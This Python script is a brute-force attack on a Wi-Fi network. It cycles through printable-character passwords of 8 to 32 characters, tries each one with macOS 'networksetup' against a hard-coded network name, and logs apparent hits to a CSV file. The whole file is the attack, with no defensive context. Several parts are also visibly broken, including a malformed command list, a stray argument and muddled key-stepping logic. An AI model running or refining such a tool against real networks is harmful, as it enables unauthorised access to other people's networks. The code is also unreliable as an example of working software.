import csv
import sys
import tempfile
import subprocess

def ft_isalpha(x):
    if x < 65 or x > 90 and x < 97 or x > 122:
        return False
    return True
 
def reset_key(size, key):
    index = 0
    while index < size:
        key.append(chr(65))
        index += 1
    return key

def after(index, key):
    for i in range(index, len(key)):
        if key[i] != chr(126):
            return False
    return True

def test(key):
    index = 0
    while index < len(key):
        if key[index] == chr(126) and index > 0:
            if after(index, key):
                key[index - 1] = chr(ord(key[index - 1]) + 1)
        if ord(key[index - 1]) > 126:
            key[index - 1] = chr(33)
        index += 1
    if key[index - 1] == chr(126):
        key[index - 1] = chr(33)
    return key

def create_csv():
    header = ["offset"]
    with open("passwordList.csv", "w") as data:
        writer = csv.writer(data)
        writer.writerow(header)

def appendline(key):
    temp = [key]
    with open("passwordList.csv", "a") as data:
        writer = csv.writer(data)
        writer.writerow(temp)

def generate_key(size, key):
    index = 33
    networkName = "Amenti"
    if size == 1:
        while index < 127:
            key[0] = chr(index)
            str_key = ''.join(key)
            #appendline(str_key)
            code_retour = subprocess.run(["networksetup -setairportnetwork en0", networkName, str_key])
            print(sys.stdout)
            # if "Error" in code_retour:
            #     print(code_retour)
            # else:
            #     appendline(str_key)
            index += 1
    else:
        last_index = len(key) - 1
        index = last_index
        i = 0
        unicode = 33
        max_possibility = (127 - 33) ** len(key)
        while i < max_possibility:
            key[index] = chr(unicode)
            print("Offset: {}".format(key))
            if ft_isalpha(ord(key[0])):
                str_key= ''.join(key)
                with tempfile.TemporaryFile() as tempf:
                    proc = subprocess.Popen(["networksetup", "-setairportnetwork" ,"en0", networkName, " ", str_key], stdout=tempf)
                    proc.wait()
                    tempf.seek(0)
                    if "Failed" in str(tempf.read()):
                        print("Failed || offset: {}".format(str_key))
                    else:
                        appendline(str_key)
            if unicode == 126:
                unicode = 32
                key = test(key)
            unicode += 1
            i += 1

def build_key(size):
    key = []
    key = reset_key(size, key)
    generate_key(size, key)

def brut_force_password(start, end):
    create_csv()
    for i in range(start,end + 1):
        build_key(i)

brut_force_password(8, 32)